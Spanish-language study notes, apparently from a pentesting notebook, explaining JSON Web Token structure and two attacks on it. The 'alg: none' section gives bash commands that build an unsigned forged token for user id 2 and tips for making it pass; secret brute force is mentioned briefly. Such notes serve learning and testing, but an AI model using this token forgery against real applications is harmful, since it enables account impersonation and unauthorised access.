-- - 
Los Json Web Tokens (JWT) son un tipo de token utilizado en la autenticación y autorización de usuarios en aplicaciones web. JWT es un estándar abierto (RFC 7519) que define un formato compacto y seguro para transmitir información entre diferentes partes de forma confiable.

En lo que respecta a la fase de enumeración y explotación de un JWT, esto se produce cuando un atacante es capaz de obtener información sobre los JWT que se utilizan en la aplicación, lo que podría permitir al atacante explotar las debilidades en la autenticación y autorización de la aplicación.

La enumeración de los JWT se produce cuando un atacante utiliza técnicas de fuerza bruta o cierta ingeniería inversa para obtener información sobre los JWT utilizados por la aplicación web. Por ejemplo, el atacante podría intentar adivinar los valores de los JWT mediante la construcción de tokens falsos, tratando de validar en todo momento si la aplicación web los acepta o no. Si el atacante tiene éxito en la enumeración de un JWT válido, podría obtener información confidencial, como nombres de usuario, contraseñas, roles de usuario y otros datos de autenticación y autorización.

La explotación de los JWT se produce cuando un atacante utiliza la información obtenida de la enumeración del JWT para explotar debilidades en la aplicación. Por ejemplo, si la aplicación web utiliza JWT para la autenticación, pero no valida adecuadamente la firma del JWT, un atacante podría falsificar el token y acceder a la aplicación web como si fuera un usuario legítimo.

Los JWT estan compuesto por 3 partes:
1. ==El header== ---> Algorith & Token type
2. **El payload** ---> Data
3. *La signature* ---> Verify Signature 
==eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9==.**eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ**.*SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c*

Estos mismos estan hechos en encodeados en base64 por lo que se los puede encodear de decodear en su propia web *jwt.io* o en la misma terminal.

-- -
## Posibles fallas en el uso de los JWT
### Algorithm = None y no ponemos signature
```bash
echo -n '{"alg":"NONE","typ":"JWT"}' | base64
eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0= ---> header modificado y encodeado en base64
```

```bash
echo -n '{"id":2,"iat":1724327756,"exp":1724331356}' | base64
eyJpZCI6MiwiaWF0IjoxNzI0MzI3NTA4LCJleHAiOjE3MjQzMzExMDh9
```
Ahora podriamos intentar juntar las 2 cadenas resultantes unidas por un punto para ver si se puede burlar la signatura
```bash 
eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJpZCI6MiwiaWF0IjoxNzI0MzI3NzU2LCJleHAiOjE3MjQzMzEzNTZ9. 
```
**Aclaracion:**
Esto funciona ya que al poner **"alg":"NONE"** no hay ningun algoritmo el cual se aplique a la signature por lo que no hace falta poner la ultima cadena, lo cual nos permitiria crear nuestros propios JWT.

**IMPORTANTE:**
Borrar el "=" que te da la primer cadena y agregar un punto al final de las 2 cadenas unidas. 
### Brute Force Attack sobre el secreto
Este otro metodo consiste en descubrir el secreto mediante puras combinaciones hasta que nos tome el JWT como valido. 
No lo considero factible.
